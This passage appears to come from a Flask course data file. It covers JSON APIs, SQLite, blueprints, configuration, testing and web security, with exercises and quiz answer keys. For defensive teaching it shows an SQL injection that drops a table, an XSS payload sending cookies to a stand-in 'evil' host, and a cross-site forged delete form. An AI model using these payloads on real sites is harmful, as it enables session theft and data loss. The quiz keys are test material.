      why: "Log the detail privately with app.logger.exception; show the visitor something plain." }
  ],
  fill: [
    { prompt: "Register a page for missing URLs.", lang: 'python',
      code: '@app.___(404)\ndef not_found(err):', opts: ["route", "errorhandler", "on_error", "catch"], correct: 1,
      why: "It maps a status code or exception class to a view." },
    { prompt: "Return the page with the right status.", lang: 'python',
      code: 'return render_template("404.html"), ___', opts: ['"404"', "404", "abort(404)", "None"], correct: 1,
      why: "A bare int as the second element of the tuple. Without it you send 200." },
    { prompt: "Stop here and hand over to the 404 handler.", lang: 'python',
      code: 'if task is None:\n    ___(404)', opts: ["raise", "abort", "error", "return"], correct: 1,
      why: "abort raises an HTTPException that Flask turns into your handler's response." }
  ]
},

"flask:13": {
  blocks: [
    ['p', "Everything so far returned HTML for a human. An API returns **data** for a program — usually your own JavaScript, which is where this track meets the other one."],
    ['h', "Returning JSON"],
    ['code', 'python', `from flask import jsonify

@app.route("/api/hobbies")
def api_hobbies():
    return jsonify(["gaming", "coding", "reading"])

@app.route("/api/user/<name>")
def api_user(name):
    return jsonify(name=name, active=True, visits=3)`],
    ['p', "Since Flask 1.1 a plain `dict` or `list` works too — Flask converts it for you:"],
    ['code', 'python', `@app.route("/api/status")
def api_status():
    return {"ok": True, "version": "1.0"}`],
    ['h', "Why the content type matters"],
    ['tbl',
      ["Returned", "Content-Type", "What `fetch` gives you"],
      [
        ["`\"[1,2,3]\"`", "`text/html`", "a string you must parse yourself"],
        ["`jsonify([1,2,3])`", "`application/json`", "a real array from `res.json()`"]
      ]
    ],
    ['note', "That header is the whole difference. `json.dumps` returns the right characters with the wrong label; `jsonify` sets both."],
    ['h', "Reading JSON in"],
    ['code', 'python', `@app.route("/api/tasks", methods=["POST"])
def create_task():
    data = request.get_json(silent=True) or {}
    title = (data.get("title") or "").strip()
    if not title:
        return jsonify(error="title is required"), 400

    task = {"id": next_id(), "title": title, "done": False}
    tasks.append(task)
    return jsonify(task), 201`],
    ['p', "`silent=True` returns `None` instead of raising when the body is not JSON. `201 Created` is the conventional status when a request made something new."],
    ['h', "Status codes an API actually uses"],
    ['tbl',
      ["Code", "Means"],
      [
        ["`200 OK`", "here is the thing"],
        ["`201 Created`", "made it; often with a `Location` header"],
        ["`204 No Content`", "worked, nothing to send back (a delete)"],
        ["`400 Bad Request`", "your JSON was missing something"],
        ["`404 Not Found`", "no such id"],
        ["`422 Unprocessable`", "well-formed but semantically wrong"]
      ]
    ],
    ['h', "Shaping URLs"],
    ['code', 'python', `GET    /api/tasks        list them
POST   /api/tasks        create one
GET    /api/tasks/3      fetch one
PUT    /api/tasks/3      replace one
PATCH  /api/tasks/3      change part of one
DELETE /api/tasks/3      remove one`],
    ['p', "Nouns in the path, verbs in the method. `/api/getTasks` and `/api/deleteTask?id=3` both work, but they throw away information HTTP already carries."],
    ['h', "Testing it without a browser"],
    ['code', 'shell', `curl http://127.0.0.1:5000/api/hobbies

curl -X POST http://127.0.0.1:5000/api/tasks ^
     -H "Content-Type: application/json" ^
     -d "{\\"title\\": \\"learn fetch\\"}"`],
    ['warn', "Forget the `Content-Type: application/json` header and `request.get_json()` returns `None`, because Flask refuses to guess. That is the single most common reason a POST body arrives empty."]
  ],
  ex: [
    { q: "Add `/api/hobbies` returning a JSON list. Check the `Content-Type` in devtools → Network.",
      a: "It should read `application/json`. Compare with a route returning `str(hobbies)` — same characters, wrong label, and `res.json()` fails on it.",
      code: ['python', `@app.route("/api/hobbies")
def api_hobbies():
    return jsonify(["gaming", "coding", "reading"])`] },
    { q: "Return `json.dumps(data)` instead of `jsonify(data)`. What is different, and why does it matter to JavaScript?",
      hint: "Look at the response headers, not the body.",
      a: "The body is identical; the header says `text/html`. `res.json()` still parses it in most browsers, but you have told every client the wrong thing — proxies, caches and strict clients will treat it as a document." },
    { q: "Write `POST /api/tasks` that requires a `title`, returns `400` with a message when it is missing, and `201` with the new object when it is present.",
      a: "Test both branches with curl. Note `or {}` — without it, a non-JSON body makes `data` `None` and `.get` raises `AttributeError`.",
      code: ['python', `@app.route("/api/tasks", methods=["POST"])
def create_task():
    data = request.get_json(silent=True) or {}
    title = (data.get("title") or "").strip()
    if not title:
        return jsonify(error="title is required"), 400
    return jsonify(title=title, done=False), 201`] },
    { q: "POST to that route with curl but no `Content-Type` header. What does `get_json()` return?",
      hint: "Flask does not guess.",
      a: "`None` — and with `silent=True` you get no error either, so the request looks like it simply had no title. Send `-H \"Content-Type: application/json\"` and it works. Learning to suspect the header first saves a lot of time." },
    { q: "Design the URLs and methods for reading, creating and deleting a task. Why not `/api/deleteTask?id=3`?",
      a: "`GET /api/tasks`, `POST /api/tasks`, `DELETE /api/tasks/3`. The verb belongs in the method because HTTP already defines what each one means: GET is safe and cacheable, DELETE is idempotent. Putting the verb in the path discards those guarantees and makes every client special-case your API." }
  ],
  quiz: [
    { q: "What does `jsonify` do that `json.dumps` does not?",
      opts: ["Formats more nicely", "Sets Content-Type: application/json", "Is faster", "Handles dates"], correct: 1,
      why: "Same characters, correct label. The header is what tells clients how to treat the body." },
    { q: "`request.get_json()` returns None on a POST that clearly had a body. Most likely cause?",
      opts: ["The body was too big", "No Content-Type: application/json header", "You need get_data()", "POST cannot carry JSON"], correct: 1,
      why: "Flask will not guess the format. Send the header, or pass force=True." },
    { q: "Which status code fits 'created it successfully'?",
      opts: ["200", "201", "204", "302"], correct: 1,
      why: "201 Created. 204 means success with nothing to return, which suits a delete." },
    { q: "Why `DELETE /api/tasks/3` rather than `GET /api/deleteTask?id=3`?",
      opts: ["It is shorter", "GET is meant to be safe and cacheable — a crawler could delete your data", "DELETE is faster", "No real difference"], correct: 1,
      why: "Anything that follows links may issue a GET. Actions that change data must not be reachable that way." }
  ],
  fill: [
    { prompt: "Return data with the right content type.", lang: 'python',
      code: 'return ___(name=name, active=True)', opts: ["json.dumps", "jsonify", "render_template", "str"], correct: 1,
      why: "It serialises and sets application/json in one step." },
    { prompt: "Read an incoming JSON body without raising.", lang: 'python',
      code: 'data = request.___(silent=True) or {}', opts: ["get_data", "form", "get_json", "json_body"], correct: 2,
      why: "silent=True returns None instead of raising when the body is not JSON." },
    { prompt: "Say that something was created.", lang: 'python',
      code: 'return jsonify(task), ___', opts: ["200", "201", "204", "301"], correct: 1,
      why: "201 Created is the conventional answer to a successful POST." }
  ]
},

"flask:14": {
  blocks: [
    ['p', "Your `app.py` keeps tasks in a Python list. Restart the server and they are gone. A database is just the version of that list which survives."],
    ['h', "SQLite comes with Python"],
    ['p', "No server to install, no configuration — the whole database is one file:"],
    ['code', 'python', `import sqlite3, os

DB_PATH = os.path.join(BASE_DIR, "app.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row      # rows behave like dicts
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                id    INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                done  INTEGER NOT NULL DEFAULT 0
            )
        """)`],
    ['note', "`row_factory = sqlite3.Row` is worth setting every time. Without it a row is a plain tuple and you index it by position (`row[1]`); with it you use names (`row[\"title\"]`), which survives a schema change."],
    ['h', "The four operations"],
    ['code', 'python', `# create
conn.execute("INSERT INTO tasks (title) VALUES (?)", (title,))

# read
rows = conn.execute("SELECT * FROM tasks ORDER BY id").fetchall()
row  = conn.execute("SELECT * FROM tasks WHERE id = ?", (task_id,)).fetchone()

# update
conn.execute("UPDATE tasks SET done = ? WHERE id = ?", (1, task_id))

# delete
conn.execute("DELETE FROM tasks WHERE id = ?", (task_id,))`],
    ['warn', "**Never build SQL with string formatting.** `f\"... WHERE id = {task_id}\"` lets a visitor end your statement and write their own. Pass values as the second argument — the `?` placeholders — and the driver keeps data and code separate. This is SQL injection, and it is still one of the most exploited bugs on the web."],
    ['code', 'python', `# catastrophic
conn.execute(f"SELECT * FROM tasks WHERE title = '{q}'")
# with q = "'; DROP TABLE tasks; --"  the table is gone

# safe, and no slower
conn.execute("SELECT * FROM tasks WHERE title = ?", (q,))`],
    ['h', "Wiring it into a route"],
    ['code', 'python', `@app.route("/")
def index():
    with get_db() as conn:
        tasks = conn.execute("SELECT * FROM tasks ORDER BY id").fetchall()
    return render_template("index.html", tasks=tasks)

@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title", "").strip()
    if title:
        with get_db() as conn:
            conn.execute("INSERT INTO tasks (title) VALUES (?)", (title,))
    return redirect(url_for("index"))`],
    ['p', "`sqlite3.Row` objects work directly in Jinja: `{{ task[\"title\"] }}`, or `{{ task.title }}`."],
    ['h', "One connection per request"],
    ['code', 'python', `from flask import g

def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()`],
    ['p', "`g` is a per-request scratchpad, cleared automatically when the request ends. This opens at most one connection per request and always closes it, even if the view raises."],
    ['h', "When to reach for an ORM"],
    ['p', "Flask-SQLAlchemy replaces the SQL with Python classes:"],
    ['code', 'python', `class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    done = db.Column(db.Boolean, default=False)

Task.query.filter_by(done=False).all()`],
    ['p', "Worth it once you have several related tables. Not worth it for one — and writing the SQL first means you understand what the ORM is doing for you."]
  ],
  ex: [
    { q: "Create `app.db` with a `tasks` table and insert two rows from a Python shell. Confirm the file appears next to `hello.py`.",
      hint: "`CREATE TABLE IF NOT EXISTS` is safe to run repeatedly.",
      a: "The database is one file — copy it, delete it, commit it (or better, gitignore it). That concreteness is why SQLite is the right place to start.",
      code: ['python', `with get_db() as conn:
    conn.execute("INSERT INTO tasks (title) VALUES (?)", ("learn SQL",))
    conn.execute("INSERT INTO tasks (title) VALUES (?)", ("build an API",))`] },
    { q: "Read the rows back with and without `row_factory = sqlite3.Row`. What changes?",
      a: "Without it a row is a tuple: `row[0]`, `row[1]`. With it you get `row[\"title\"]`. The tuple version breaks silently the moment you add a column in the middle." },
    { q: "Write `search(q)` using a `?` placeholder, then explain what `q = \"'; DROP TABLE tasks; --\"` would do to the f-string version.",
      hint: "The quote closes the string; the semicolon starts a new statement.",
      a: "In the f-string version that value ends the SELECT and runs a DROP. With a placeholder it is just a search term that matches nothing — the driver never treats parameters as SQL.",
      code: ['python', `def search(q):
    with get_db() as conn:
        return conn.execute(
            "SELECT * FROM tasks WHERE title LIKE ?", ("%" + q + "%",)
        ).fetchall()`] },
    { q: "Replace the in-memory `tasks` list in your `app.py` with database calls for listing and adding. Restart the server and confirm the data is still there.",
      a: "That restart is the whole point — it is the first time your app has remembered anything." },
    { q: "Why use `g` and `teardown_appcontext` rather than opening a connection at module level?",
      a: "A module-level connection is shared by every request and every thread, and SQLite objects are not safe to use across threads by default. `g` gives each request its own, and the teardown closes it even when the view raises — so a failing request cannot leak a connection." }
  ],
  quiz: [
    { q: "Why pass values as `(value,)` rather than formatting them into the SQL?",
      opts: ["It is faster", "It prevents SQL injection", "It is required by SQLite", "It formats dates"], correct: 1,
      why: "Placeholders keep data and code separate. String formatting lets a visitor end your statement and write their own." },
    { q: "What does `conn.row_factory = sqlite3.Row` change?",
      opts: ["Speeds up queries", "Rows become accessible by column name", "Enables transactions", "Adds an id column"], correct: 1,
      why: "Without it rows are tuples indexed by position, which breaks when the schema changes." },
    { q: "What is `g` in Flask?",
      opts: ["A global shared by all requests", "A scratchpad for the current request, cleared afterwards", "The database", "A template variable"], correct: 1,
      why: "One connection per request, closed by teardown_appcontext even if the view raises." },
    { q: "Where does a SQLite database live?",
      opts: ["A server process", "A single file on disk", "In memory only", "In the templates folder"], correct: 1,
      why: "One file. Copy it, delete it, back it up — which is what makes it ideal for learning." }
  ],
  fill: [
    { prompt: "Pass the value safely.", lang: 'python',
      code: 'conn.execute("SELECT * FROM tasks WHERE id = ___", (task_id,))', opts: ["%s", "?", "{}", "$1"], correct: 1,
      why: "sqlite3 uses ? placeholders; the values go in the tuple." },
    { prompt: "Make rows accessible by column name.", lang: 'python',
      code: 'conn.row_factory = sqlite3.___', opts: ["Dict", "Row", "Record", "Mapping"], correct: 1,
      why: "Otherwise a row is a plain tuple indexed by position." },
    { prompt: "Fetch exactly one row.", lang: 'python',
      code: 'row = conn.execute(sql, args).___()', opts: ["fetchall", "fetchone", "first", "get"], correct: 1,
      why: "fetchone returns a single row or None; fetchall returns a list." }
  ]
},

"flask:15": {
  blocks: [
    ['p', "Your `app.py` is 231 lines and holds routes, a fake database, a login decorator and a context processor. Every Flask app reaches this point. Blueprints and the app factory are the standard way out."],
    ['h', "The problem with a module-level app"],
    ['code', 'python', `app = Flask(__name__)       # created when the file is imported`],
    ['ul', [
      "Importing anything from this file starts building the app, whether you wanted it or not.",
      "Tests cannot create a second app with different settings.",
      "Split the routes into another file and that file must import `app`, while `app.py` must import the routes — a circular import."
    ]],
    ['h', "The factory"],
    ['code', 'python', `# app/__init__.py
from flask import Flask

def create_app(config=None):
    app = Flask(__name__)
    app.config.from_object("config.Default")
    if config:
        app.config.update(config)

    from .views.main import main_bp
    from .views.tasks import tasks_bp
    app.register_blueprint(main_bp)
    app.register_blueprint(tasks_bp, url_prefix="/tasks")

    return app`],
    ['p', "Nothing exists until you call it. Tests build their own; production builds one with different settings; the circular import disappears because the imports happen **inside** the function, after `app` exists."],
    ['h', "A blueprint"],
    ['code', 'python', `# app/views/tasks.py
from flask import Blueprint, render_template

tasks_bp = Blueprint("tasks", __name__, template_folder="templates")

@tasks_bp.route("/")
def index():
    return render_template("tasks/index.html")

@tasks_bp.route("/<int:task_id>")
def detail(task_id):
    return render_template("tasks/detail.html", task_id=task_id)`],
    ['p', "Same decorator you already know — `@tasks_bp.route` instead of `@app.route`. A blueprint is a group of routes that has not been attached to an app yet."],
    ['h', "Endpoint names gain a prefix"],
    ['code', 'python', `url_for("tasks.index")          # -> /tasks/
url_for("tasks.detail", task_id=3)   # -> /tasks/3
url_for("main.home")            # -> /`],
    ['warn', "This is the change that breaks templates during a refactor. `url_for(\"index\")` becomes `url_for(\"tasks.index\")`, and the old form raises `BuildError`. Inside the same blueprint you may use a leading dot — `url_for(\".detail\")` — which keeps it relative."],
    ['h', "A layout that scales"],
    ['code', 'text', `app/
  __init__.py        create_app()
  db.py              get_db(), init_db()
  views/
    main.py          main_bp
    tasks.py         tasks_bp
    api.py           api_bp
  templates/
    base.html
    tasks/index.html
  static/
config.py
run.py               from app import create_app; create_app().run()`],
    ['h', "Running it"],
    ['code', 'shell', `$env:FLASK_APP = "app:create_app"
flask run --debug`],
    ['p', "The Flask CLI recognises a factory and calls it for you. `flask routes` then shows the blueprint-qualified endpoint names, which is a quick way to check the wiring."]
  ],
  ex: [
    { q: "List three concrete problems with creating `app = Flask(__name__)` at module level.",
      a: "Importing the module builds the app as a side effect; tests cannot construct a second app with different config; splitting routes into other modules creates a circular import because they need `app` and `app` needs them." },
    { q: "Convert your `/favorites` and `/profile` routes into a blueprint registered under `/people`.",
      hint: "`Blueprint(name, __name__)`, then `@bp.route`.",
      a: "The URLs become `/people/favorites/<name>` and `/people/profile/<name>/<age>`.",
      code: ['python', `from flask import Blueprint, render_template

people_bp = Blueprint("people", __name__)

@people_bp.route("/favorites/<name>")
def favorites(name):
    return render_template("favorites.html", name=name, items=["pizza"])

# app.register_blueprint(people_bp, url_prefix="/people")`] },
    { q: "After that change, `url_for(\"favorites\")` raises `BuildError`. Why, and what are the two ways to fix it?",
      a: "Endpoints are namespaced by blueprint, so it is now `people.favorites`. Either write it fully, or from a template rendered by that same blueprint use the relative form `url_for(\".favorites\")`." },
    { q: "Write a `create_app(config=None)` factory that registers two blueprints and accepts config overrides.",
      hint: "Import the blueprints inside the function.",
      a: "The inner imports are the point — they run after `app` exists, so the circular dependency never forms.",
      code: ['python', `def create_app(config=None):
    app = Flask(__name__)
    app.config.from_object("config.Default")
    if config:
        app.config.update(config)

    from .views.main import main_bp
    from .views.tasks import tasks_bp
    app.register_blueprint(main_bp)
    app.register_blueprint(tasks_bp, url_prefix="/tasks")
    return app`] },
    { q: "How does a factory make testing easier? Give a concrete example.",
      a: "A test can build an app configured for testing without touching the real one: `create_app({\"TESTING\": True, \"DB_PATH\": \":memory:\"})`. Each test gets a fresh app and a throwaway database, so tests cannot leak state into each other — impossible when there is one module-level app baked in at import time." }
  ],
  quiz: [
    { q: "What does an app factory solve?",
      opts: ["Faster startup", "Importing no longer builds the app, and tests can make their own", "Smaller files", "Automatic routing"], correct: 1,
      why: "Nothing exists until create_app() is called, which also breaks the circular import between app and its routes." },
    { q: "After registering a blueprint named `tasks`, what does `url_for(\"index\")` do?",
      opts: ["Works as before", "Raises BuildError — it is now `tasks.index`", "Returns /tasks", "Returns None"], correct: 1,
      why: "Endpoints are namespaced. Use `tasks.index`, or `.index` from inside the same blueprint." },
    { q: "Where should blueprint imports go in a factory?",
      opts: ["At the top of the file", "Inside create_app, after app exists", "In a separate config", "Anywhere"], correct: 1,
      why: "Importing inside the function is what avoids the circular import." },
    { q: "How do you point the Flask CLI at a factory?",
      opts: ["FLASK_APP=app.py", "FLASK_APP=app:create_app", "FLASK_FACTORY=1", "It cannot"], correct: 1,
      why: "The CLI detects a callable and calls it to build the app." }
  ],
  fill: [
    { prompt: "Create a group of routes not yet attached to an app.", lang: 'python',
      code: 'tasks_bp = ___("tasks", __name__)', opts: ["Flask", "Blueprint", "Module", "Router"], correct: 1,
      why: "A blueprint collects routes; register_blueprint attaches them." },
    { prompt: "Attach it under a URL prefix.", lang: 'python',
      code: 'app.___(tasks_bp, url_prefix="/tasks")', opts: ["add_blueprint", "register_blueprint", "mount", "include"], correct: 1,
      why: "Registration is what actually adds the rules to the app's URL map." },
    { prompt: "Build a URL for a view inside a blueprint.", lang: 'python',
      code: 'url_for("___")', opts: ["index", "tasks.index", "tasks/index", "bp:index"], correct: 1,
      why: "Blueprint name, a dot, then the view function name." }
  ]
},

"flask:16": {
  blocks: [
    ['p', "The same code has to run on your laptop with debug on and a throwaway database, and in production with neither. Configuration is how one codebase does both without edits."],
    ['h', "app.config is a dict"],
    ['code', 'python', `app.config["SECRET_KEY"] = "..."
app.config["DEBUG"] = True
app.config.update(TESTING=True, DB_PATH=":memory:")

app.config["SECRET_KEY"]              # read it back anywhere
current_app.config.get("DB_PATH")     # inside a blueprint`],
    ['p', "Flask reads some keys itself — `SECRET_KEY`, `DEBUG`, `TESTING`, `MAX_CONTENT_LENGTH`, the `SESSION_COOKIE_*` family. The rest are yours to invent."],
    ['h', "Config classes"],
    ['code', 'python', `# config.py
import os

class Default:
    SECRET_KEY = os.environ.get("SECRET_KEY")
    DB_PATH = os.path.join(os.path.dirname(__file__), "app.db")
    ITEMS_PER_PAGE = 20

class Development(Default):
    DEBUG = True

class Testing(Default):
    TESTING = True
    DB_PATH = ":memory:"

class Production(Default):
    SESSION_COOKIE_SECURE = True`],
    ['code', 'python', `app.config.from_object("config.Development")`],
    ['p', "Inheritance means each environment only states its differences. Only uppercase names are picked up — a lowercase attribute is ignored, which is a handy way to keep helpers out of the config."],
    ['h', "Secrets come from the environment"],
    ['code', 'python', `SECRET_KEY = os.environ.get("SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("SECRET_KEY is not set")`],
    ['warn', "Never write `os.environ.get(\"SECRET_KEY\", \"dev\")`. A default secret is a published secret — it is in your repository, so anyone can forge sessions on any deployment that forgot to set the real one. Fail loudly instead."],
    ['h', "A .env file for development"],
    ['code', 'text', `# .env — in .gitignore, never committed
SECRET_KEY=3f9a1c...
DEBUG=true
DB_PATH=dev.db`],
    ['code', 'python', `from dotenv import load_dotenv
load_dotenv()          # reads .env into os.environ before config is built`],
    ['p', "Flask's CLI loads `.env` automatically when `python-dotenv` is installed. Commit a `.env.example` with the keys and no values, so anyone cloning knows what to set."],
    ['h', "Choosing the environment"],
    ['code', 'python', `def create_app():
    app = Flask(__name__)
    env = os.environ.get("APP_ENV", "development").capitalize()
    app.config.from_object("config." + env)
    return app`],
    ['tbl',
      ["Setting", "Development", "Production"],
      [
        ["`DEBUG`", "True", "**False** — always"],
        ["`SECRET_KEY`", "from `.env`", "from the host's secrets"],
        ["`SESSION_COOKIE_SECURE`", "False (no HTTPS locally)", "True"],
        ["Database", "a local file", "a real server"]
      ]
    ]
  ],
  ex: [
    { q: "Create a `config.py` with `Default`, `Development` and `Testing` classes, and load one with `from_object`.",
      a: "Print `app.config[\"DB_PATH\"]` under each to confirm the inheritance is doing what you expect.",
      code: ['python', `app.config.from_object("config.Development")
print(app.config["DEBUG"], app.config["DB_PATH"])`] },
    { q: "Add a lowercase attribute `secret = \"x\"` to a config class. Does it appear in `app.config`?",
      hint: "Flask filters by name.",
      a: "No — `from_object` only reads **uppercase** attributes. That is deliberate: it lets you keep helper functions and imports in the same module without polluting the config." },
    { q: "Explain concretely what goes wrong with `os.environ.get(\"SECRET_KEY\", \"dev\")`.",
      a: "The fallback lives in your repository, so it is public. Any deployment where the real variable was not set silently runs on a key everyone can read — and anyone can then forge a session cookie claiming to be any user. The failure is invisible: the app starts perfectly." },
    { q: "Make the environment selectable with an `APP_ENV` variable, defaulting to development.",
      hint: "Build the class path as a string.",
      a: "Running `$env:APP_ENV = \"testing\"` then starting the app now switches the whole configuration with no code change.",
      code: ['python', `env = os.environ.get("APP_ENV", "development").capitalize()
app.config.from_object("config." + env)`] },
    { q: "Why commit `.env.example` but not `.env`?",
      a: "`.env` holds real secrets and must never be in version control. `.env.example` lists the same keys with blank or dummy values, so someone cloning the project knows exactly what to set without you having to remember to tell them. Add `.env` to `.gitignore` before the first commit — removing it later leaves it in the history." }
  ],
  quiz: [
    { q: "Which attributes does `from_object` load from a config class?",
      opts: ["All of them", "Only uppercase ones", "Only strings", "Only those in __all__"], correct: 1,
      why: "Lowercase names are ignored, so helpers can live in the same module." },
    { q: "What is wrong with `os.environ.get(\"SECRET_KEY\", \"dev\")`?",
      opts: ["Nothing", "The fallback is committed, so it is public — and it silently applies in production", "It is slow", "get() cannot take a default"], correct: 1,
      why: "Anyone can forge sessions with a known key, and the app starts normally so nothing warns you." },
    { q: "Where should `.env` be?",
      opts: ["Committed for the team", "In .gitignore, with a committed .env.example", "In static/", "In templates/"], correct: 1,
      why: "Real values stay local; the example documents which keys exist." },
    { q: "Which must be False in production?",
      opts: ["TESTING", "DEBUG", "SESSION_COOKIE_SECURE", "SESSION_COOKIE_HTTPONLY"], correct: 1,
      why: "The debug console runs arbitrary Python for anyone who can reach the page." }
  ],
  fill: [
    { prompt: "Load settings from a class.", lang: 'python',
      code: 'app.config.___("config.Development")', opts: ["from_file", "from_object", "load", "read"], correct: 1,
      why: "It imports the path and copies every uppercase attribute." },
    { prompt: "Refuse to start without a real secret.", lang: 'python',
      code: 'if not SECRET_KEY:\n    ___ RuntimeError("SECRET_KEY is not set")', opts: ["return", "raise", "print", "assert"], correct: 1,
      why: "Failing loudly beats defaulting to a key that is published in your repo." },
    { prompt: "Read config from inside a blueprint.", lang: 'python',
      code: '___.config.get("ITEMS_PER_PAGE")', opts: ["app", "current_app", "flask", "g"], correct: 1,
      why: "There is no module-level `app` when you use a factory; current_app resolves during a request." }
  ]
},

"flask:17": {
  blocks: [
    ['p', "You have been testing by clicking. That works until there are twenty routes, and then it does not. Flask can make requests to itself, with no browser and no running server."],
    ['h', "The test client"],
    ['code', 'python', `def test_about_page():
    app = create_app({"TESTING": True})
    client = app.test_client()

    response = client.get("/about")

    assert response.status_code == 200
    assert b"care about us" in response.data`],
    ['p', "`client.get` returns a real response object — the same one your view produced. Nothing is mocked; the whole request goes through routing, the view and the template."],
    ['note', "`response.data` is **bytes**, so compare against a `b\"...\"` literal, or use `response.get_data(as_text=True)` for a string. Forgetting this is the first error everybody hits."],
    ['h', "What you can assert on"],
    ['code', 'python', `response.status_code        # 200, 404, 302 ...
response.data              # bytes of the body
response.get_json()        # parsed JSON, or None
response.headers["Location"]   # where a redirect points
response.mimetype          # "text/html", "application/json"`],
    ['h', "Testing a form"],
    ['code', 'python', `def test_add_rejects_empty_title():
    client = create_app({"TESTING": True}).test_client()

    response = client.post("/add", data={"title": "   "})

    assert response.status_code == 302              # redirected back
    assert response.headers["Location"].endswith("/")

def test_add_accepts_a_title():
    client = create_app({"TESTING": True}).test_client()

    response = client.post("/add", data={"title": "milk"}, follow_redirects=True)

    assert b"milk" in response.data`],
    ['p', "`follow_redirects=True` makes the client do what a browser does — chase the 302 and return the final page. Without it you get the redirect itself, which is what you want when the redirect *is* the thing you are testing."],
    ['h', "pytest fixtures remove the repetition"],
    ['code', 'python', `# tests/conftest.py
import pytest
from app import create_app

@pytest.fixture
def app():
    return create_app({"TESTING": True, "DB_PATH": ":memory:"})

@pytest.fixture
def client(app):
    return app.test_client()`],
    ['code', 'python', `# tests/test_routes.py
def test_home(client):
    assert client.get("/").status_code == 200

def test_missing(client):
    assert client.get("/nope").status_code == 404`],
    ['p', "pytest matches the argument name to the fixture, so every test asking for `client` gets a freshly built one. That is the payoff from the app factory in the previous lesson."],
    ['h', "Sessions in a test"],
    ['code', 'python', `def test_secret_requires_login(client):
    assert client.get("/secret").status_code == 302      # bounced to login

    with client.session_transaction() as session:
        session["user"] = "itay"

    assert client.get("/secret").status_code == 200`],
    ['h', "Running them"],
    ['code', 'shell', `pip install pytest
pytest -q`],
    ['code', 'text', `....                                              [100%]
4 passed in 0.12s`],
    ['warn', "`TESTING=True` makes Flask re-raise exceptions instead of turning them into 500 pages, so a broken view fails the test with a real traceback rather than an unhelpful assertion about a status code."]
  ],
  ex: [
    { q: "Write a test asserting `/about` returns 200 and contains its text. Run it with pytest.",
      hint: "`response.data` is bytes.",
      a: "Comparing a `str` against `response.data` always fails, and the message is confusing. Use a `b\"...\"` literal or `get_data(as_text=True)`.",
      code: ['python', `def test_about(client):
    response = client.get("/about")
    assert response.status_code == 200
    assert b"care about us" in response.data`] },
    { q: "Test that `/user/25` and `/user/itay` reach different handlers.",
      hint: "Assert on what each returns.",
      a: "This locks in the converter-precedence behaviour from lesson 04, so a later refactor cannot silently break it.",
      code: ['python', `def test_user_routes(client):
    assert b"26" in client.get("/user/25").data
    assert b"hello itay" in client.get("/user/itay").data`] },
    { q: "Test the empty-title case of your add form. Which status do you assert, and why not `follow_redirects=True`?",
      a: "Assert `302` and check the `Location` header. Following the redirect would test the destination page instead of the thing you care about, which is that the POST refused the input and bounced back.",
      code: ['python', `response = client.post("/add", data={"title": "   "})
assert response.status_code == 302`] },
    { q: "Write `conftest.py` with `app` and `client` fixtures, then a test using only `client`.",
      hint: "pytest matches the parameter name.",
      a: "Every test now starts from a fresh app with an in-memory database, so no test can affect another." },
    { q: "How do you test a page that requires being logged in, without going through the login form?",
      hint: "`client.session_transaction()`.",
      a: "Write the session directly, so the test targets the protected page rather than re-testing login every time. Test the login form once, separately.",
      code: ['python', `with client.session_transaction() as session:
    session["user"] = "itay"
assert client.get("/secret").status_code == 200`] }
  ],
  quiz: [
    { q: "What type is `response.data`?",
      opts: ["str", "bytes", "dict", "Response"], correct: 1,
      why: "Compare against b\"...\" or use get_data(as_text=True). This is the first error everybody hits." },
    { q: "What does `follow_redirects=True` do?",
      opts: ["Allows external URLs", "Chases the 302 and returns the final page", "Speeds up the test", "Ignores errors"], correct: 1,
      why: "Leave it off when the redirect itself is what you are asserting on." },
    { q: "Why does `TESTING=True` matter?",
      opts: ["It disables routing", "Exceptions are re-raised instead of becoming 500 pages", "It uses a fake database", "It skips templates"], correct: 1,
      why: "You get the real traceback rather than a confusing assertion about a status code." },
    { q: "Do you need the dev server running to use `test_client`?",
      opts: ["Yes", "No — requests go through the app in-process", "Only for POST", "Only with a database"], correct: 1,
      why: "No sockets, no port, no browser. That is why it is fast enough to run on every save." }
  ],
  fill: [
    { prompt: "Make requests without a browser.", lang: 'python',
      code: 'client = app.___()', opts: ["test_request", "test_client", "client", "session"], correct: 1,
      why: "It dispatches straight into the app, with no network involved." },
    { prompt: "Compare against the body correctly.", lang: 'python',
      code: 'assert ___"care about us" in response.data', opts: ["", "b", "r", "f"], correct: 1,
      why: "response.data is bytes, so the literal must be too." },
    { prompt: "Log a test in without using the form.", lang: 'python',
      code: 'with client.___() as session:\n    session["user"] = "itay"', opts: ["session", "session_transaction", "login", "context"], correct: 1,
      why: "It opens the session for writing, then commits it into the client's cookie jar." }
  ]
},

"flask:18": {
  blocks: [
    ['p', "Not a survey of everything — the handful of mistakes that actually get small Flask apps broken into, and what the defaults already do for you."],
    ['h', "XSS: what autoescaping buys you"],
    ['p', "Jinja escapes every `{{ }}` in an `.html` template. Without that, a comment box is a way to run code in every other visitor's browser:"],
    ['code', 'jinja', `{{ comment }}          {# safe: tags render as visible text     #}
{{ comment|safe }}     {# runs whatever they typed              #}`],
    ['code', 'text', `comment = <script>fetch('http://evil/'+document.cookie)<\/script>

with escaping:     the text appears on the page, harmlessly
with |safe:        every visitor's session cookie is sent to evil`],
    ['warn', "Only ever use `|safe` on markup **you** generated. The same applies to `Markup(...)` and `{% autoescape false %}`."],
    ['h', "CSRF: why your own form needs a token"],
    ['p', "A logged-in visitor's cookie is sent automatically on every request to your site — including one triggered by someone else's page:"],
    ['code', 'html', `<!-\- on attacker.example, while you are logged into my-app -\->
<form action="https://my-app/delete-account" method="post">
  <button>Win a prize</button>
</form>`],
    ['p', "The fix is a secret only your own pages know:"],
    ['code', 'python', `from flask_wtf.csrf import CSRFProtect
CSRFProtect(app)`],
    ['code', 'jinja', `<form method="post">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>`],
    ['note', "`SESSION_COOKIE_SAMESITE=\"Lax\"` — Flask's default — already blocks most cross-site POSTs. Tokens are still the belt to that braces."],
